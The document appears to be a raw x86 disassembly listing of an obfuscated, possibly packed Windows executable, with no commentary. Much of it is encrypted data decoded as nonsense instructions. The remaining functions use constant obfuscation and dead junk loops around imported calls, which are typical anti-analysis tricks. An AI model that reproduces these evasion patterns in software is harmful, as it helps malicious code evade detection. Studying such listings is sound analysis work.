  40e259:	fimul  DWORD PTR [eax]
  40e25b:	add    DWORD PTR [esi+0x2fcea2e6],0x5a
  40e262:	popf   
  40e263:	stc    
  40e264:	inc    edi
  40e265:	cs mov eax,0x54affb8b
  40e26b:	cmp    al,0x5c
  40e26d:	ja     0x40e296
  40e26f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e270:	inc    ebx
  40e271:	jb     0x40e2a2
  40e273:	push   cs
  40e274:	push   ebx
  40e275:	mov    ebp,0x3b38efbf
  40e27a:	mov    bh,0x50
  40e27c:	or     ebp,DWORD PTR [ecx]
  40e27e:	sahf   
  40e27f:	and    al,0xf7
  40e281:	mov    al,0x85
  40e283:	jo     0x40e2c2
  40e285:	imul   edx,DWORD PTR [edx-0x253924b6],0x34
  40e28c:	inc    ecx
  40e28d:	(bad)  
  40e28e:	hlt    
  40e28f:	mov    bl,0x2e
  40e291:	mov    eax,DWORD PTR [edx]
  40e293:	jo     0x40e26a
  40e295:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e296:	or     DWORD PTR [edi+0x223d2582],edi
  40e29c:	adc    eax,0xe8cc3ae
  40e2a1:	xchg   edi,eax
  40e2a2:	cmp    ebp,esi
  40e2a4:	popa   
  40e2a5:	inc    esp
  40e2a6:	test   eax,0x6d948da8
  40e2ab:	jae    0x40e260
  40e2ad:	icebp  
  40e2ae:	ja     0x40e252
  40e2b0:	push   ecx
  40e2b1:	mov    edi,0xffd09988
  40e2b6:	dec    ebx
  40e2b7:	mov    edi,0x600a0246
  40e2bc:	dec    ebp
  40e2bd:	and    DWORD PTR [ebx+0x7fb1468],ebx
  40e2c3:	dec    eax
  40e2c4:	pop    esp
  40e2c5:	es jp  0x40e25c
  40e2c8:	(bad)  
  40e2c9:	sbb    eax,DWORD PTR [ebp-0x448dee46]
  40e2cf:	xor    al,0xb1
  40e2d1:	dec    ebp
  40e2d2:	ins    BYTE PTR es:[edi],dx
  40e2d3:	mov    dl,0x84
  40e2d5:	loope  0x40e32c
  40e2d7:	outs   dx,BYTE PTR ds:[esi]
  40e2d8:	ja     0x40e278
  40e2da:	sub    dl,dl
  40e2dc:	sahf   
  40e2dd:	fisubr DWORD PTR [eax+0x70cbce86]
  40e2e3:	lock mov BYTE PTR [ebp-0x28],dh
  40e2e7:	inc    edi
  40e2e8:	ret    
  40e2e9:	imul   esp,DWORD PTR [eax+0x2c5aa442],0x4e
  40e2f0:	pusha  
  40e2f1:	stos   BYTE PTR es:[edi],al
  40e2f2:	inc    eax
  40e2f3:	outs   dx,BYTE PTR ds:[esi]
  40e2f4:	sub    eax,0xf87626a4
  40e2f9:	sub    eax,0x1539637f
  40e2fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e2ff:	scas   eax,DWORD PTR es:[edi]
  40e300:	xchg   DWORD PTR [edi],ebp
  40e302:	inc    ebp
  40e303:	lahf   
  40e304:	dec    ebx
  40e305:	retf   
  40e306:	jg     0x40e2ae
  40e308:	add    cl,BYTE PTR [ebp+esi*8-0x3d9bd1b7]
  40e30f:	in     eax,0x1e
  40e311:	in     eax,0x15
  40e313:	sub    eax,ebp
  40e315:	jecxz  0x40e33c
  40e317:	xchg   esi,eax
  40e318:	dec    ebx
  40e31a:	push   ds
  40e31b:	mov    esp,0x80ef98ee
  40e320:	test   DWORD PTR [edi],ebx
  40e322:	mov    edi,0x1defc164
  40e327:	clc    
  40e328:	call   0xa26dadb5
  40e32d:	add    al,0x73
  40e32f:	fdivrp st(0),st
  40e331:	jno    0x40e2b6
  40e333:	dec    ebx
  40e334:	xor    edx,edx
  40e336:	add    DWORD PTR [ebp-0xc],ebx
  40e339:	pop    ebx
  40e33a:	mov    eax,DWORD PTR [ebp-0xc]
  40e33d:	pop    edi
  40e33e:	pop    esi
  40e33f:	pop    ebx
  40e340:	leave  
  40e341:	ret    0x10
  40e344:	push   ebp
  40e345:	mov    ebp,esp
  40e347:	push   ecx
  40e348:	mov    DWORD PTR ds:0x433717,0x77e5
  40e352:	push   ecx
  40e353:	mov    DWORD PTR ds:0x433827,0xd96
  40e35d:	mov    eax,0xf89c8532
  40e362:	mov    DWORD PTR ds:0x4337eb,0x6f59
  40e36c:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40e373:	push   esi
  40e374:	movzx  ecx,WORD PTR ds:0x43376b
  40e37b:	mov    DWORD PTR [ebp-0x8],eax
  40e37e:	mov    ecx,DWORD PTR [ebp+0x8]
  40e381:	mov    DWORD PTR ds:0x4337bb,0x659
  40e38b:	push   edi
  40e38c:	mov    edi,0x7510854
  40e391:	not    esi
  40e393:	mov    esi,0x32729b
  40e398:	mov    DWORD PTR ds:0x433767,0x4cec
  40e3a2:	cmp    ecx,eax
  40e3a4:	mov    DWORD PTR ds:0x4337af,0x27d6
  40e3ae:	jmp    0x40e4db
  40e3b3:	cs jecxz 0x40e357
  40e3b6:	add    eax,0xf1aa4571
  40e3bb:	push   0x47
  40e3bd:	popf   
  40e3be:	jmp    FWORD PTR [eax]
  40e3c0:	loopne 0x40e37f
  40e3c2:	push   edx
  40e3c3:	aas    
  40e3c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3c5:	jle    0x40e445
  40e3c7:	push   cs
  40e3c8:	jg     0x40e448
  40e3ca:	jle    0x40e3c1
  40e3cc:	in     al,0xb6
  40e3ce:	enter  0xdf00,0xb7
  40e3d2:	cli    
  40e3d3:	sbb    eax,0xd623d6b1
  40e3d8:	test   BYTE PTR [ecx],0xf2
  40e3db:	icebp  
  40e3dc:	popf   
  40e3dd:	je     0x40e364
  40e3df:	add    BYTE PTR [eax],al
  40e3e1:	add    DWORD PTR [ecx-0x2bc27ab7],0xffffffff
  40e3e8:	and    ch,BYTE PTR fs:[edx+0x14]
  40e3ec:	xor    eax,0x189c81d6
  40e3f1:	loopne 0x40e425
  40e3f3:	add    eax,0x2e47c9d3
  40e3f8:	out    dx,eax
  40e3f9:	and    DWORD PTR es:[ebp+0x1797156d],edx
  40e400:	adc    DWORD PTR [ebp+ecx*2+0xe],ecx
  40e404:	aad    0xdf
  40e406:	neg    BYTE PTR [ebp-0x5856a13c]
  40e40c:	dec    edi
  40e40d:	jae    0x40e3a5
  40e40f:	test   BYTE PTR [edi-0x7602fea8],dh
  40e415:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e416:	inc    ebx
  40e417:	xor    bl,BYTE PTR cs:[ebp+0x2]
  40e41b:	add    ebp,DWORD PTR [edi-0x2f5a7b8f]
  40e421:	inc    eax
  40e422:	add    BYTE PTR [edi+0x11],0xc5
  40e426:	shl    al,1
  40e428:	repnz aaa 
  40e42a:	cmp    cl,BYTE PTR [esi+0x37]
  40e42d:	jg     0x40e3d4
  40e42f:	xor    cl,cl
  40e431:	jge    0x40e3f7
  40e433:	and    eax,0x3e14f13a
  40e438:	or     cl,dl
  40e43a:	pop    esp
  40e43b:	mov    cl,0xaa
  40e43d:	adc    al,0x80
  40e43f:	daa    
  40e440:	adc    ch,BYTE PTR [eax+0x2a2d7fd6]
  40e446:	mov    ebp,0xdd8dcf3e
  40e44b:	add    DWORD PTR [edi-0x1],esi
  40e44e:	fild   WORD PTR [eax-0x21]
  40e451:	xchg   edi,eax
  40e452:	adc    ch,bl
  40e454:	or     al,0x72
  40e456:	or     ebp,DWORD PTR [eax+0x48e56966]
  40e45c:	push   edi
  40e45d:	int3   
  40e45e:	scas   al,BYTE PTR es:[edi]
  40e45f:	jg     0x40e46c
  40e461:	cmp    al,0xaf
  40e463:	dec    ebp
  40e464:	pushf  
  40e465:	mov    cs,WORD PTR [ecx]
  40e467:	pop    eax
  40e468:	and    cl,BYTE PTR [ebx]
  40e46a:	or     eax,0x5d97a172
  40e46f:	cmp    esp,DWORD PTR [eax+ebx*1+0x12]
  40e473:	jmp    0x40e456
  40e475:	pop    es
  40e476:	aad    0x22
  40e478:	add    BYTE PTR [eax],0x71
  40e47b:	and    ch,cl
  40e47d:	dec    ebp
  40e47e:	outs   dx,BYTE PTR ds:[esi]
  40e47f:	xchg   eax,eax
  40e481:	jmp    0xf47b:0xf2b06bf3
  40e488:	imul   eax,DWORD PTR [edx+0x4bbd8e04],0xffffff93
  40e48f:	arpl   WORD PTR [ecx+0x1a],bp
  40e492:	stos   DWORD PTR es:[edi],eax
  40e493:	icebp  
  40e494:	pop    ss
  40e495:	mov    WORD PTR [eax],?
  40e497:	xrelease mov BYTE PTR ds:0x6ee2cd13,ch
  40e49e:	or     DWORD PTR [edx-0x120bdaff],ebp
  40e4a4:	call   0x808b:0x4bc33d09
  40e4ab:	mov    eax,ds:0x84b58f56
  40e4b0:	xchg   edx,eax
  40e4b1:	(bad)  
  40e4b3:	imul   DWORD PTR [ebx-0x205c84e0]
  40e4b9:	pusha  
  40e4ba:	aam    0x9b
  40e4bc:	sub    al,0x24
  40e4be:	mov    BYTE PTR [edx+0x6b],bh
  40e4c1:	mov    bl,cl
  40e4c3:	mov    BYTE PTR [edx+0x71],bh
  40e4c6:	loopne 0x40e4d2
  40e4c8:	mul    DWORD PTR [eax-0x11]
  40e4cb:	mov    ah,0x41
  40e4cd:	xchg   ecx,eax
  40e4ce:	lock sbb bl,bl
  40e4d1:	sbb    DWORD PTR [ecx+ebx*8+0x18],eax
  40e4d5:	inc    esi
  40e4d6:	jmp    DWORD PTR [esp+ecx*1-0x3f]
  40e4da:	or     DWORD PTR [edi],ecx
  40e4dc:	test   dl,bh
  40e4de:	add    DWORD PTR [eax],eax
  40e4e0:	add    BYTE PTR [ecx+0x43383305],al
  40e4e6:	add    BYTE PTR [ebp-0x74ffffce],bh
  40e4ec:	inc    ebp
  40e4ed:	cld    
  40e4ee:	mov    ecx,DWORD PTR [ebp+0xc]
  40e4f1:	xor    DWORD PTR ds:0x433717,0x4337bf
  40e4fb:	xor    eax,edi
  40e4fd:	add    eax,esi
  40e4ff:	cmp    eax,ecx
  40e501:	mov    DWORD PTR ds:0x433833,0x147f
  40e50b:	je     0x40e6db
  40e511:	and    DWORD PTR ds:0x4337a7,0x0
  40e51b:	jmp    0x40e52b
  40e520:	mov    eax,ds:0x4337a7
  40e525:	inc    eax
  40e526:	mov    ds:0x4337a7,eax
  40e52b:	cmp    DWORD PTR ds:0x4337a7,0x13
  40e532:	jae    0x40e568
  40e538:	cmp    DWORD PTR ds:0x4337a7,0x9
  40e53f:	jne    0x40e54b
  40e545:	call   DWORD PTR ds:0x412030
  40e54b:	cmp    DWORD PTR ds:0x4337a7,0x8
  40e552:	jne    0x40e563
  40e558:	mov    eax,ds:0x4337a7
  40e55d:	inc    eax
  40e55e:	mov    ds:0x4337a7,eax
  40e563:	jmp    0x40e520
  40e568:	mov    eax,DWORD PTR [ebp-0x4]
  40e56b:	sub    edx,DWORD PTR ds:0x4337bb
  40e571:	xor    eax,edi
  40e573:	dec    edx
  40e574:	add    eax,esi
  40e576:	push   eax
  40e577:	adc    DWORD PTR ds:0x4337b3,0x52cc
  40e581:	push   DWORD PTR [ebp-0x8]
  40e584:	or     DWORD PTR ds:0x43377b,edx
  40e58a:	push   DWORD PTR [ebp-0x4]
  40e58d:	mov    edx,DWORD PTR ds:0x413bde
  40e593:	call   0x406864
  40e598:	mov    ecx,DWORD PTR ds:0x413bde
  40e59e:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40e5a4:	mov    DWORD PTR [ecx],eax
  40e5a6:	mov    eax,DWORD PTR [ebp-0x8]
  40e5a9:	jmp    0x40e840
  40e5ae:	jmp    0x40e6db
  40e5b3:	xor    dl,BYTE PTR [ebp-0x2e]
  40e5b6:	fs jno 0x40e61a
  40e5b9:	mov    al,0x51
  40e5bb:	sti    
  40e5bc:	adc    eax,0x5e989328
  40e5c1:	lds    esi,FWORD PTR [ecx]
  40e5c3:	iret   
  40e5c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e5c5:	jle    0x40e645
  40e5c7:	push   cs
  40e5c8:	jg     0x40e648
  40e5ca:	jle    0x40e5e5
  40e5cc:	or     bh,bl
  40e5ce:	mov    al,0x4a
  40e5d0:	lds    ecx,FWORD PTR ds:0xc06ba862
  40e5d6:	je     0x40e64b
  40e5d8:	mov    al,0x2c
  40e5da:	(bad)  
  40e5dc:	hlt    
  40e5dd:	pusha  
  40e5de:	push   cs
  40e5df:	cmp    DWORD PTR [ebx],edi
  40e5e1:	or     al,0x7a
  40e5e3:	and    ebx,esi
  40e5e5:	seto   BYTE PTR [eax+0x6a22dbbd]
  40e5ec:	imul   edi,DWORD PTR [ebx-0x7e18e0c5],0x19
  40e5f3:	stos   DWORD PTR es:[edi],eax
  40e5f4:	call   DWORD PTR [edi-0x4a]
  40e5f7:	and    BYTE PTR [edx+0x70e7f073],al
  40e5fd:	inc    esp
  40e5fe:	aas    
  40e5ff:	xor    eax,0x26a21c39
  40e604:	int    0x58
  40e606:	mov    ds,ebp
  40e608:	sub    DWORD PTR [ecx],ebp
  40e60a:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e60c:	cli    
  40e60d:	aam    0xea
  40e60f:	(bad)  
  40e610:	jo     0x40e666
  40e612:	xor    eax,0x3341758e
  40e617:	sub    BYTE PTR [edi],ch
  40e619:	inc    edi
  40e61a:	aam    0x2a
  40e61c:	stos   BYTE PTR es:[edi],al
  40e61d:	aaa    
  40e61e:	inc    edi
  40e61f:	jg     0x40e69b
  40e621:	push   ds
  40e622:	inc    esi
  40e623:	xabort 0xac
  40e626:	mov    ds:0xdc5fb4d,eax
  40e62b:	in     eax,0x6c
  40e62d:	mov    edx,0x81d4997
  40e632:	outs   dx,DWORD PTR ds:[esi]
  40e633:	push   0x8886b628
  40e638:	mov    eax,ds:0x72943446
  40e63d:	jns    0x40e67a
  40e63f:	fdecstp 
  40e641:	int    0x3a
  40e643:	leave  
  40e644:	xchg   ecx,eax
  40e645:	(bad)  
  40e646:	outs   dx,DWORD PTR ds:[esi]
  40e647:	lods   eax,DWORD PTR ds:[esi]
  40e648:	mov    ebx,0x9fd06fe6
  40e64d:	fidivr DWORD PTR [ebx-0x3e463d95]
  40e653:	inc    eax
  40e654:	sub    DWORD PTR ds:0x77bc47cc,edx
  40e65a:	and    DWORD PTR [ecx],edi
  40e65c:	push   eax
  40e65d:	loope  0x40e621
  40e65f:	adc    al,0x64
  40e661:	xchg   edx,eax
  40e662:	call   0xd79195b0
  40e667:	sub    ebx,DWORD PTR [ebp-0x3a]
  40e66a:	loope  0x40e619
  40e66c:	cmp    eax,0x1cbbe763
  40e671:	daa    
  40e672:	add    DWORD PTR [eax],edx
  40e674:	cmp    BYTE PTR [eax+0x12a3c1eb],ch
  40e67a:	xchg   ecx,eax
  40e67b:	jno    0x40e64c
  40e67d:	xchg   ebx,eax
  40e67e:	aaa    
  40e67f:	push   esp
  40e680:	pop    ebx
  40e681:	icebp  
  40e682:	jmp    0x40e633
  40e684:	mov    bl,0xbe
  40e686:	xor    BYTE PTR [esi-0x69],bl
  40e689:	mov    DWORD PTR [ebx],edx
  40e68b:	mov    ?,WORD PTR [eax]
  40e68d:	inc    ebp
  40e68e:	fwait
  40e68f:	sub    esi,DWORD PTR [ebp+0x4b174a67]
  40e695:	ja     0x40e68c
  40e697:	lods   eax,DWORD PTR ds:[esi]
  40e698:	cmp    esi,ebp
  40e69a:	jnp    0x40e6aa
  40e69c:	adc    ebp,DWORD PTR [esi+0x2d]
  40e69f:	sbb    eax,0x4f5ee264
  40e6a4:	pop    ds
  40e6a5:	or     BYTE PTR [ebp+0x36],bl
  40e6a8:	add    eax,0xb72ca2f4
  40e6ad:	cmp    BYTE PTR [edi-0x10488fa7],ch
  40e6b3:	push   edx
  40e6b4:	push   ds
  40e6b5:	shr    BYTE PTR [esi+0xe],0xb6
  40e6b9:	addr16 push esi
  40e6bb:	jne    0x40e6ef
  40e6bd:	pop    ebp
  40e6be:	add    al,0xd8
  40e6c0:	and    DWORD PTR [edi-0x33],edx
  40e6c3:	mov    dh,0xa4
  40e6c5:	int    0x2b
  40e6c7:	int3   
  40e6c8:	jne    0x40e697
  40e6ca:	mov    esp,0xf67e2f46
  40e6cf:	retf   
  40e6d0:	mov    eax,ds:0xeffc8124
  40e6d5:	jns    0x40e6b9
  40e6d7:	ins    DWORD PTR es:[edi],dx
  40e6d8:	dec    ebx
  40e6d9:	xchg   ebp,eax
  40e6da:	sbb    BYTE PTR [ebx+0x4d8bfc45],cl
  40e6e0:	adc    BYTE PTR [ebx],dh
  40e6e2:	mov    DWORD PTR [ebx],0xfc13bc6
  40e6e8:	test   DWORD PTR [eax+0x1],edx
  40e6eb:	add    BYTE PTR [eax],al
  40e6ed:	mov    eax,DWORD PTR [ebp-0x4]
  40e6f0:	xor    eax,edi
  40e6f2:	add    eax,esi
  40e6f4:	jmp    0x40e821
  40e6f9:	xor    BYTE PTR [ebx+0x7369636a],al
  40e6ff:	xor    DWORD PTR [ecx+0x23],edx
  40e702:	mov    ebp,0x8530a1
  40e707:	cmp    bl,BYTE PTR [edx]
  40e709:	fbld   TBYTE PTR [edx+0x7f0e7e7e]
  40e70f:	jle    0x40e78f
  40e711:	sbb    dh,BYTE PTR [ebp+0x7f]
  40e714:	push   cs
  40e715:	jg     0x40e78e
  40e717:	xchg   ebx,eax
  40e718:	dec    esp
  40e719:	shr    bl,0xf9
  40e71c:	jo     0x40e6ac
  40e71e:	or     ah,BYTE PTR ds:0xdb13c33d
  40e724:	mov    bl,0x90
  40e726:	test   BYTE PTR [esi-0x64],ch
  40e729:	rcr    dl,0x3d
  40e72c:	ins    DWORD PTR es:[edi],dx
  40e72d:	in     al,dx
  40e72e:	outs   dx,BYTE PTR gs:[esi]
  40e730:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e731:	retf   
  40e732:	ret    
  40e733:	and    eax,0x21991fdc
  40e738:	add    eax,0x1a8ea91f
  40e73d:	mov    ebx,0x28baedb
  40e742:	sbb    ah,BYTE PTR [edx-0x21]
  40e745:	clc    
  40e746:	push   ebx
  40e747:	xchg   ebp,eax
  40e748:	xor    al,0xbb
  40e74a:	gs aad 0x44
  40e74d:	mov    al,ds:0x4f8689e3
  40e752:	out    0xd6,eax
  40e754:	mov    DWORD PTR [ebx+0x18],ebp
  40e757:	push   ss
  40e758:	sub    al,0x1
  40e75a:	sbb    edi,DWORD PTR [edi]
  40e75c:	sbb    eax,0xa931c711
  40e761:	(bad)  
  40e762:	cmp    dh,dl
  40e764:	rol    DWORD PTR [ebx+0x1b],cl
  40e767:	add    ebp,DWORD PTR [esi+0x2f2fbbef]
  40e76d:	add    DWORD PTR [edx],0xda53348a
  40e773:	dec    ecx
  40e774:	sti    
  40e775:	xor    bl,BYTE PTR [ecx]
  40e777:	loope  0x40e73b
  40e779:	mov    bl,0x61
  40e77b:	scas   eax,DWORD PTR es:[edi]
  40e77c:	jnp    0x40e72b
  40e77e:	int3   
  40e77f:	and    DWORD PTR ds:0x6429b278,edi
  40e785:	jle    0x40e709
  40e787:	pop    ds
  40e788:	stos   BYTE PTR es:[edi],al
  40e789:	and    edi,DWORD PTR [eax-0x9f92948]
  40e78f:	cmc    
  40e790:	adc    DWORD PTR [esi-0x1b],esp
  40e793:	in     al,0x1
  40e795:	pop    edi
  40e796:	xor    edx,DWORD PTR fs:[ebx-0x41]
  40e79a:	mov    bh,0x5
  40e79c:	xor    eax,0x1b5d13ea
  40e7a1:	add    al,0xbc
  40e7a3:	(bad)  
  40e7a5:	inc    ebx
  40e7a6:	ja     0x40e761
  40e7a8:	inc    esi
  40e7a9:	cmp    al,0xc5
  40e7ab:	xlat   BYTE PTR ds:[ebx]
  40e7ac:	and    BYTE PTR [eax+0x37],0xdb
  40e7b0:	iret   
  40e7b1:	jge    0x40e7da
  40e7b3:	add    eax,DWORD PTR [edx-0x450dd3a0]
  40e7b9:	push   0x5fada73b
  40e7be:	in     eax,0xe5
  40e7c0:	push   edx
  40e7c1:	test   DWORD PTR [ebp-0x75],edi
  40e7c4:	jge    0x40e829
  40e7c6:	sbb    BYTE PTR [eax+0x188c3b6f],dl
  40e7cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e7cd:	mov    bl,0x11
  40e7cf:	ja     0x40e7fd
  40e7d1:	cli    
  40e7d2:	jb     0x40e819
  40e7d4:	pop    ecx
  40e7d5:	std    
  40e7d6:	xor    DWORD PTR [ebx+0x2f],0xffffffb2
  40e7da:	cmp    DWORD PTR [ebp+0x13dac7d0],ecx
  40e7e0:	add    DWORD PTR [ecx],esp
  40e7e2:	pop    esi
  40e7e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e7e4:	sub    DWORD PTR [eax],ecx
  40e7e6:	cmp    edx,ebp
  40e7e8:	or     ah,BYTE PTR [edi+ebp*4+0x38e36ff]
  40e7ef:	xchg   ecx,eax
  40e7f0:	popa   
  40e7f1:	cmp    BYTE PTR [ebx],bh
  40e7f3:	stos   BYTE PTR es:[edi],al
  40e7f4:	jb     0x40e836
  40e7f6:	adc    ecx,DWORD PTR [esi+0x37]
  40e7f9:	(bad)  
  40e7fa:	out    0x8d,al
  40e7fc:	iret   
  40e7fd:	jbe    0x40e7d3
  40e7ff:	xor    eax,0x1edc5da7
  40e804:	(bad)  
  40e805:	test   eax,0x40445f93
  40e80a:	pop    esp
  40e80b:	(bad)  
  40e80c:	and    eax,0xedc07584
  40e811:	jo     0x2612a009
  40e817:	sub    dl,BYTE PTR [esp+eax*2+0xf]
  40e81b:	aaa    
  40e81c:	shl    BYTE PTR [ebp+ecx*4+0x7c],0x7
  40e821:	mov    ds:0x413c62,eax
  40e826:	mov    eax,DWORD PTR [ebp-0x4]
  40e829:	xor    eax,edi
  40e82b:	add    eax,esi
  40e82d:	mov    ds:0x413c5a,eax
  40e832:	push   DWORD PTR [ebp-0x8]
  40e835:	push   DWORD PTR [ebp-0x4]
  40e838:	call   0x40e84a
  40e83d:	mov    eax,DWORD PTR [ebp-0x4]
  40e840:	xor    eax,edi
  40e842:	pop    edi
  40e843:	add    eax,esi
  40e845:	pop    esi
  40e846:	leave  
  40e847:	ret    0xc
  40e84a:	push   ebp
  40e84b:	mov    ebp,esp
  40e84d:	sub    esp,0x60
  40e850:	mov    eax,DWORD PTR [ebp+0x8]
  40e853:	push   ebx
  40e854:	and    DWORD PTR ds:0x43383f,0x0
  40e85e:	jmp    0x40e870
  40e863:	mov    ebx,DWORD PTR ds:0x43383f
  40e869:	inc    ebx
  40e86a:	mov    DWORD PTR ds:0x43383f,ebx
  40e870:	cmp    DWORD PTR ds:0x43383f,0x19
  40e877:	jae    0x40e8a2
  40e87d:	cmp    DWORD PTR ds:0x43383f,0x1e
  40e884:	jne    0x40e893
  40e88a:	push   DWORD PTR [ebp-0x14]
  40e88d:	call   DWORD PTR ds:0x412034
  40e893:	jmp    0x40e863
  40e898:	sub    DWORD PTR ds:0x4337bf,0x283f
  40e8a2:	push   esi
  40e8a3:	and    DWORD PTR ds:0x4337ff,0x0
  40e8ad:	mov    esi,DWORD PTR ds:0x4337ff
  40e8b3:	inc    esi
  40e8b4:	mov    DWORD PTR ds:0x4337ff,esi
  40e8ba:	cmp    DWORD PTR ds:0x4337ff,0x10
  40e8c1:	jne    0x40e8d5
  40e8c7:	push   0x43377f
  40e8cc:	push   DWORD PTR [ebp-0x28]
  40e8cf:	call   DWORD PTR ds:0x4123ac
  40e8d5:	cmp    DWORD PTR ds:0x4337ff,0xf
  40e8dc:	jne    0x40e8ef
  40e8e2:	mov    esi,DWORD PTR ds:0x4337ff
  40e8e8:	inc    esi
  40e8e9:	mov    DWORD PTR ds:0x4337ff,esi
  40e8ef:	cmp    DWORD PTR ds:0x4337ff,0x1a
  40e8f6:	jb     0x40e8ad
  40e8fc:	mov    DWORD PTR ds:0x4337f7,0x1e
  40e906:	cmp    DWORD PTR ds:0x4337f7,0x0
  40e90d:	je     0x40e960
  40e913:	cmp    DWORD PTR ds:0x4337f7,0xc
  40e91a:	jne    0x40e933
  40e920:	push   0x6d58
  40e925:	push   DWORD PTR [ebp-0x20]
  40e928:	push   0x30b0
  40e92d:	call   DWORD PTR ds:0x4121e0
  40e933:	cmp    DWORD PTR ds:0x4337f7,0xd
  40e93a:	jne    0x40e94d
  40e940:	mov    ebx,DWORD PTR ds:0x4337f7
  40e946:	dec    ebx
  40e947:	mov    DWORD PTR ds:0x4337f7,ebx
  40e94d:	mov    ebx,DWORD PTR ds:0x4337f7
  40e953:	dec    ebx
  40e954:	mov    DWORD PTR ds:0x4337f7,ebx
  40e95a:	jmp    0x40e906
  40e95f:	dec    esi
  40e960:	mov    esi,0x7510854
  40e965:	xor    eax,esi
  40e967:	mov    ebx,0x32729b
  40e96c:	add    eax,ebx
  40e96e:	and    DWORD PTR ds:0x4337a7,0x3e06
  40e978:	push   edi
  40e979:	neg    DWORD PTR ds:0x43372b
  40e97f:	mov    DWORD PTR [ebp-0x18],eax
  40e982:	and    DWORD PTR ds:0x43371b,0x0
  40e98c:	mov    edi,DWORD PTR ds:0x43371b
  40e992:	inc    edi
  40e993:	mov    DWORD PTR ds:0x43371b,edi
  40e999:	cmp    DWORD PTR ds:0x43371b,0x21
  40e9a0:	jne    0x40e9b4
  40e9a6:	push   DWORD PTR [ebp-0x1c]
  40e9a9:	push   0x4337bb
  40e9ae:	call   DWORD PTR ds:0x4121e4
  40e9b4:	cmp    DWORD PTR ds:0x43371b,0x12
  40e9bb:	jb     0x40e98c
  40e9c1:	sbb    DWORD PTR ds:0x43371b,edx
  40e9c7:	mov    edi,DWORD PTR [ebp+0x8]
  40e9ca:	xor    edi,esi
  40e9cc:	and    DWORD PTR ds:0x43376b,0x43370f
  40e9d6:	mov    DWORD PTR [ebp-0xc],0xf89c85f1
  40e9dd:	adc    DWORD PTR ds:0x433837,0x4337bf
  40e9e7:	mov    DWORD PTR [ebp-0x10],0xf89c8731
  40e9ee:	sub    DWORD PTR ds:0x43377f,0x4337bb
  40e9f8:	add    edi,ebx
  40e9fa:	mov    DWORD PTR ds:0x4337ab,0x5e0d
  40ea04:	jmp    0x40f1b9
  40ea09:	cmp    edi,0x40
  40ea0c:	jne    0x40ec91
  40ea12:	movzx  eax,BYTE PTR ds:0x43371f
  40ea19:	mov    eax,ds:0x413a5e
  40ea1e:	jmp    0x40ec4b
  40ea23:	xchg   BYTE PTR [edi],dh
  40ea25:	inc    ebx
  40ea26:	(bad)  
  40ea27:	jae    0x40ea94
  40ea29:	push   edx
  40ea2a:	aaa    
  40ea2b:	mov    ds:0xad103a68,al
  40ea30:	mov    eax,ds:0xa3efedb4
  40ea35:	jle    0x40eab5
  40ea37:	push   cs
  40ea38:	jl     0x40eab8
  40ea3a:	jle    0x40ea95
  40ea3c:	adc    eax,0xed8ec0f8
  40ea42:	in     al,0xf1
  40ea44:	mov    ebp,0xca378a02
  40ea49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea4a:	or     al,BYTE PTR [esi]
  40ea4c:	addr16 fadd st(1),st
  40ea4f:	push   es
  40ea50:	jae    0x40ea13
  40ea52:	mov    ebx,0xa0b1576f
  40ea57:	dec    edi
  40ea58:	inc    ecx
  40ea59:	push   edx
  40ea5a:	mov    edx,DWORD PTR [edi+0x2d93d07b]
  40ea60:	xor    edx,ebx
  40ea62:	xchg   ecx,eax
  40ea63:	xchg   ch,dl
  40ea65:	aas    
  40ea66:	mov    bh,0xc2
  40ea68:	data16 xor cl,BYTE PTR [edi+eiz*2+0x7b]
  40ea6d:	jae    0x40eab9
  40ea6f:	(bad)  [edx-0x32cc78a9]
  40ea75:	test   eax,0xe5c0efa9
  40ea7a:	pop    esi
  40ea7b:	push   ss
  40ea7c:	scas   eax,DWORD PTR es:[edi]
  40ea7d:	aaa    
  40ea7e:	cmp    al,0x3f
  40ea80:	mov    es,WORD PTR ds:0x1be15094
  40ea86:	mov    ds:0x84b2f6ff,al
  40ea8b:	xchg   DWORD PTR [ecx-0x7e8f3b66],eax
  40ea91:	ja     0x40ea43
  40ea93:	jecxz  0x40ea44
  40ea95:	mov    eax,0x6b42b6bf
  40ea9a:	sub    DWORD PTR [ecx-0x24a74fa4],ebx
  40eaa0:	pop    edi
  40eaa1:	fs nop
  40eaa3:	adc    BYTE PTR [ecx-0x32],dl
  40eaa6:	mov    ds:0x1b118a6a,eax
  40eaab:	xchg   edx,eax
  40eaac:	mov    edx,0x3e58b796
  40eab1:	cmc    
  40eab2:	xor    dl,0x77
  40eab5:	pusha  
  40eab6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eab7:	pop    ds
  40eab8:	inc    ebx
  40eab9:	das    
  40eaba:	out    0x71,eax
  40eabc:	dec    edi
  40eabd:	cdq    
  40eabe:	mov    DWORD PTR [eax+0x27],edi
  40eac1:	cmp    eax,0xdb133374
  40eac6:	ss cwde 
  40eac8:	pop    es
  40eac9:	jmp    0x40eadb
  40eacb:	adc    DWORD PTR [ebx+0x2aee3f66],esi
  40ead1:	dec    esi
  40ead2:	jmp    FWORD PTR [eax-0x9]
  40ead5:	test   BYTE PTR [edi],cl
  40ead7:	js     0x40eb06
  40ead9:	mov    esi,0x1329c6ef
  40eade:	lea    ebx,[eax+0x67c65ef0]
  40eae4:	imul   ecx,edx,0xffffffb0
  40eae7:	jnp    0x40eb5e
  40eae9:	sbb    ebx,edi
  40eaeb:	jg     0x40eb09
  40eaed:	cmc    
  40eaee:	jns    0x40eaeb
  40eaf0:	push   ss
  40eaf1:	mov    dl,0x3f
  40eaf3:	(bad)  
  40eaf4:	jp     0x40ead8
  40eaf6:	mov    esp,0x8014a9a4
  40eafb:	daa    
  40eafc:	pop    ds
  40eafd:	add    edi,DWORD PTR [edi+0x3ec78525]
  40eb03:	pusha  
